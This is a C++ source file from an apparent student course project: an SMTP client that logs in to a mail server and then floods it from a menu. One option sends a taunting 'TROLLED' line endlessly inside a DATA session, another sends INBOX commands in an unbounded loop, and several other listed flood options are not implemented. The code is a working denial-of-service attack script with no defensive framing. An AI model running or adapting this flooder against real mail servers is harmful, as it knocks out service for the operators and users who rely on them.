//Course: 4050-212-02
//Authors: Alex Buie, Luke Matarazzo, Jackson Sadowski, Steven Tucker
//IDE/editor: Sublime Text 2
//Compilers: mingw32-g++
//Final SMTP Project
//Filename: Client.cpp   client main
//Purpose: 

#include <iostream>
#include <cstdlib>
#include "Status.h"
#include "ClientSocket.h"

//prototypes
string trim(string);

int main(int argc, char * argv[])
{
    if(argc != 3)
    {
        cout << "USAGE: " << argv[0] << " servername(ip) portnum (usually 31000)" << endl;
        return 1;
    }

    int port = atoi(argv[2]); //port number to connect to
    string ipAddress = string(argv[1]); //ip address to connect to
    string recMessage; //message it receives
    string sendMessage; //message it sends
    string username = ""; //will hold username
    int serverFlop = 0; //will hold value given by recv function and will be -1 if the server flops and shuts down

    //print that we're attempting to connect
    cout << "Connecting to: " << ipAddress << ":" << port << endl;

    ClientSocket sockClient; //clientsocket object instance
    sockClient.connectToServer(ipAddress.c_str(), port); //connect to the server using the ip and port given

    //receive the first 220 message
    serverFlop = sockClient.recvData(recMessage);
    if(recMessage.substr(0,3) == "220")
    {
        sockClient.sendData("HELO 127.0.0.1");
    }
    else
    {
        cout << "Server did not indicate that they were ready to initiate a connection :(\n";
        return 69; //end program
    }

    serverFlop = sockClient.recvData(recMessage); //receive next status message from server
    if(recMessage.substr(0,3) == "250") //prompt for login info and send it
    {
        cout << "Username: ";
        getline(cin, username);
        username = trim(username);

        sendMessage = "VRFY " + username;
        sockClient.sendData(sendMessage);
    }
    else
    {
        cout << "Server may not have gotten our 'HELO' :(\n";
        return 69; //ends program
    }

    //receive server response after login
    serverFlop = sockClient.recvData(recMessage);

    //check if we logged in successfully
    if(recMessage.substr(0,3) == "550" || recMessage.substr(0,3) == "500") //if login fails, print error and end program
    {
        cout << "Invalid user...\n";
        sockClient.closeConnection(); //close connection
        return 1;
    }
    else if(recMessage.substr(0,3) == "250")
    {
        cout << "Logon successful.\n\n";
    }
    else
    {
        cout << "Unknown error when attempting to login to server...\n";
        return -69; //ends program
    }

    string menu = "1. Send infinite data\n2. Send Read Inbox Forever\n3. Send bad command forever\n4. Send VRFY forever\n";
    menu += "5. Send the same email forever (takes a little bit of time)\n6. Quit\n"; //our menu of options
    int option = 1;

    while(option != 6) //while they don't enter 3 for the quit option, keep prompting for selection
    {
        if(serverFlop == -1)
        {
            cout << "There's been an unknown error on the server. Try reconnecting momentarily...\n\n";
            break;
        }
        if(option > 0 && option < 4) //only print menu if they entered a valid option last time
        {
            cout << menu; //print menu
        }

        //prompt for an option and get the option
        cout << endl << "Enter option: ";
        cin >> option;

        string recipient; //will hold the recipient
        int messageCount = 0; //will count how many messages we have received. for formatting purposes
        int lineCount = 0; //will count how many lines per message were sent. needed to know when to data is being sent
        int numLines = 0;
        string messBuf = ""; //will hold the entire message and act as a buffer before printing it

        switch(option)
        {
            case 1: //option 1, to send an email
                //send who the mail is from and receive response
                sendMessage = "MAIL FROM:<guest@" + ipAddress + ">"; //set what we're sending
                sockClient.sendData(sendMessage); //notify server that we're sending mail
                serverFlop = sockClient.recvData(recMessage); //get the response from the server

                //check for an error
                if(!sockClient.checkError(recMessage, Status::SMTP_ACTION_COMPLETE))
                {
                    cout << recMessage << endl;
                    break; //break if we found one
                }
                    

                //get recipient of the email
                cout << "Enter the recipient's email address (user@1.2.3.4): "; //prompts for recipient
                cin >> recipient; //get the recipient

                //send recipient of the email
                sendMessage = "RCPT TO:<" + recipient + ">"; //set what we're sending
                sockClient.sendData(sendMessage); //send data
                serverFlop = sockClient.recvData(recMessage); //get response

                //check for an error
                if(!sockClient.checkError(recMessage, Status::SMTP_ACTION_COMPLETE))
                {
                    cout << recMessage << endl;
                    break; //break if we found one
                }


                //send data to the server and get a response
                sockClient.sendData("DATA"); //send that we're ready to send data
                serverFlop = sockClient.recvData(recMessage); //get the response

                //check for an error
                if(!sockClient.checkError(recMessage, Status::SMTP_BEGIN_MSG))
                    break; //break if we found one

                cout << "how many lines of garbage would you like to send? (0 means infinite): ";
                cin >> numLines;

                //set sendmessage
                sendMessage = "YOU ARE BEING TROLLED. TROLOLOL. YOU ARE BEING TROLLED. TROLOLOL. YOU ARE BEING TROLLED. TROLOLOL.";

                if(numLines == 0)
                {
                    while(true) //send forever
                    {
                        sockClient.sendData(sendMessage); //send the data
                    }
                }
                else
                {
                    for(int i = 0; i < numLines; i++) //send for user specified amount
                    {
                        sockClient.sendData(sendMessage); //send the data
                    }
                }
                
                sockClient.sendData("."); //send final period

                cout << "Payload complete.\n\n";

                break; //break from case
            case 2: //option 2, to read messages in the user's mailbox
                cout << "how many times would you like to send INBOX? (0 means infinite): ";
                cin >> numLines;

                if(numLines == 0)
                {
                    while(true) //send forever
                    {
                        sockClient.sendData("INBOX"); //send the data
                    }
                }
                else
                {
                    for(int i = 0; i < numLines; i++) //send for user specified amount
                    {
                        sockClient.sendData("INBOX"); //send the data
                    }
                }

                cout << "Payload complete.\n";
                // cout << "End of the inbox!\n\n"; //letting the client know it's the end of their inbox
                break;
            case 6: //option 3, to quit
                //code
                cout << "You chose to quit, goodbye.\n\n";
                sockClient.sendData("QUIT"); //send quit to the server so it knows we're disconnecting
                //sockClient.recvData(recMessage); //get the final message
                break;
            default:
                cerr << "You entered an invalid command...\n";
                break;
        }
    }

    //close the connection
    sockClient.closeConnection();

    return 0; //ends program
}

string trim(string s)
{   
    while(isspace(s[0])) //if the first thing is a space, erase it until it is longer a space.
    {
        s.erase(0, 1); //remove the first index because it is a space
    }

    while(isspace(s[s.length()-1])) //if the last char of the string is a space, remove it until it is no longer a space
    {
        s.erase(s.length()-1, 1); //remove that char because it is a space
    }

    return s; //return the final string
}
